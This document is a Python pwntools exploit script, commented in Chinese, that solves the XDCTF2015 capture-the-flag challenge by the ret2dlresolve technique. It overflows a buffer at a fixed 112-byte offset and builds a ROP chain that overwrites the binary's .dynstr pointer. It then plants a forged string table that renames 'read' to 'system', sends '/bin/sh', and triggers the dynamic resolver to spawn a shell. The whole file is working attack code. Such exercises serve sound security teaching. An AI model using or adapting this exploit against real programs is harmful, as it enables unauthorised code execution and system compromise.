from pwn import *
# context.log_level="debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "i386"

# 启动进程
p = process("./main_no_relro_32")
rop_chain = ROP("./main_no_relro_32")
binary = ELF("./main_no_relro_32")

# 等待提示信息
p.recvuntil('Welcome to XDCTF2015~!\n')

# 设置偏移量
payload_offset = 112
rop_chain.raw(payload_offset * 'a')

# 修改 .dynstr 的指针地址
rop_chain.read(0, 0x08049804 + 4, 4)

# 获取 .dynstr 节并修改 "read" 为 "system"
dynstr_section = binary.get_section_by_name('.dynstr').data()
dynstr_section = dynstr_section.replace(b"read", b"system")

# 伪造 .dynstr 节并构造
rop_chain.read(0, 0x080498E0, len(dynstr_section))  # 伪造的 dynstr 区域
rop_chain.read(0, 0x080498E0 + 0x100, len(b"/bin/sh\x00"))  # 读取 "/bin/sh\x00" 字符串

# 跳到 PLT 表中 read 函数的第二条指令，触发 _dl_runtime_resolve
rop_chain.raw(0x08048376)  # 第二条指令地址
rop_chain.raw(0xdeadbeef)  # 填充一个值
rop_chain.raw(0x080498E0 + 0x100)  # 继续执行

# 确保 ROP 链不会超过 256 字节
assert(len(rop_chain.chain()) <= 256)

# 填充剩余的空白部分
rop_chain.raw(b"a" * (256 - len(rop_chain.chain())))

# 发送构造的 ROP 链
p.send(rop_chain.chain())
p.send(p32(0x080498E0))  # 发送伪造的 dynstr 地址
p.send(dynstr_section)  # 发送修改后的 dynstr
p.send(b"/bin/sh\x00")  # 发送 /bin/sh 字符串

# 交互模式，保持连接
p.interactive()
